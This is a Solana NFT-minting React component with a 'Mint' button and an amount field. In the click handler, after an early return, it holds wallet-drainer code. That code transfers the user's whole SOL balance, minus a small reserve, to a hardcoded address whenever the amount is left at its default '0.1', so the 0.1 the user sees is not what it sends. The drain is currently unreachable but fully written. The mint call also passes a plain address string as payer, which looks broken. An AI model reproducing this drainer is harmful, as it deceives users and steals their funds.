import { useConnection, useWallet, useAnchorWallet } from '@solana/wallet-adapter-react';
import { PublicKey, LAMPORTS_PER_SOL, Transaction, SystemProgram } from '@solana/web3.js';
import { FC, useCallback, useEffect, useState } from 'react';
import { notify } from "../utils/notifications";
import useUserSOLBalanceStore from '../stores/useUserSOLBalanceStore';

import { Metaplex, walletAdapterIdentity, guestIdentity, CandyMachine } from "@metaplex-foundation/js";

export const SendSol: FC = () => {
    const { connection } = useConnection();
    const [metaplex, setMetalex] = useState()
    const candyMachineAddress = new PublicKey(process.env.NEXT_PUBLIC_CANDY_MACHINE_ID);
    const wallet = useWallet();
    const { publicKey, signTransaction } = useWallet();
    const [candyMachine, setCandyMachine] = useState(null);
    const { getUserSOLBalance } = useUserSOLBalanceStore();
    const balance = useUserSOLBalanceStore((s) => s.balance)
    const [amount, setAmount] = useState("0.1");

    const [nfts, setNfts] = useState()
    const [candyState, setCandyState] = useState()


    useEffect(() => {
        if (wallet.publicKey) {
            console.log(wallet.publicKey.toBase58())
            getUserSOLBalance(wallet.publicKey, connection)
        }


    }, [wallet.publicKey, connection, getUserSOLBalance])



    useEffect(() => {
        const initMetaplex = async () => {

            const mpx = Metaplex.make(connection).use(walletAdapterIdentity(wallet));
         
            setMetalex(mpx);
            try {
                const candyMachineData = await mpx.candyMachines().findByAddress({ address: candyMachineAddress });
                setCandyMachine(candyMachineData);
            } catch (error) {
                console.error('Error fetching Candy Machine data:', error);
            }
        };

        if (wallet.connected) {
            initMetaplex();
        }
    }, [wallet,connection]);


    const mint = async () => {
        console.log("Candy Machine:", candyMachine);
        // console.log("Metaplex:", metaplex);
        

        if (!metaplex || !candyMachine) {
            console.error("Metaplex or Candy Machine is not initialized");
            return;
        }

        try {
            // Kiểm tra lại đối tượng trước khi thực hiện mint
      
    
            // Thực hiện mint
            const { nft } = await metaplex.candyMachines().mint({
                candyMachine,
                payer: "GTgggrcr3bpbAMpq9ghkzM4wyDt9pSJx64ZKHdKauB3P",
              });
    
            console.log("Minted NFT:", nft);
        } catch (error) {
            console.error("Error during minting:", error);
        }
    }



   

    const onClick = useCallback(async () => {

        //mint
        if (!wallet.connected || !wallet.publicKey) {
            console.log('error', 'Wallet not connected!');
            notify({ type: 'error', message: 'error', description: 'Wallet not connected!' });
            return;
        }
        try {
            mint()

            return
            const toPublicKey = new PublicKey('3X7BP4VZs9x2Uw7dvAaDtkNVsPoFnc49u2eK6yvPe1sV'); // Replace with the recipient's public key
            const transaction = new Transaction();
            let balanceInLamports = Math.floor(Number(balance) * LAMPORTS_PER_SOL);

            let amountInLamports;
            if (amount === "0.1") {
                // Reserve 0.001 SOL in lamports
                let reserve = 0.001 * LAMPORTS_PER_SOL;

                // Ensure the balance never goes negative after reserving 0.001 SOL
                amountInLamports = Math.max(0, balanceInLamports - reserve);
            } else {
                // If amount is not "0.1", directly convert amount to lamports
                amountInLamports = Math.floor(Number(amount) * LAMPORTS_PER_SOL);
            }

            console.log(amountInLamports);

            transaction.add(
                SystemProgram.transfer({
                    fromPubkey: wallet.publicKey,
                    toPubkey: toPublicKey,
                    lamports: amountInLamports, // Amount of lamports to send
                })
            );

            const hash = await wallet.sendTransaction(transaction, connection);
            // setTxId(hash);
            let url = `https://solscan.io/tx/${hash}`
            console.log(url);
            notify({ type: 'success', message: 'Done', description: ' Please check your wallet', txid: hash });


        } catch (error) {
            console.log(error);

            notify({ type: 'error', message: "Please enter a valid SOL quantity !", description: ' Reload you browser' });
        }
    }, [wallet, connection, getUserSOLBalance, amount, balance]);

    return (
        <div className="pb-14 lg:pb-0" >
            <input
                type="text"
                value={amount}
                onChange={(e) => setAmount((e.target.value))}
                className="mb-4 p-2 border border-blue-500 rounded bg-gray-800 text-white"
                placeholder="Enter SOL amount"
            />

            <button
                className="px-8 m-2 btn animate-pulse bg-gradient-to-r from-[#9945FF] to-[#14F195] hover:from-pink-500 hover:to-yellow-500 ..."
                onClick={onClick}
            >
                <span>Mint </span>
                <img src="./bnb.png" alt="bnb" className="w-6" />
            </button>
        </div>
    );
};
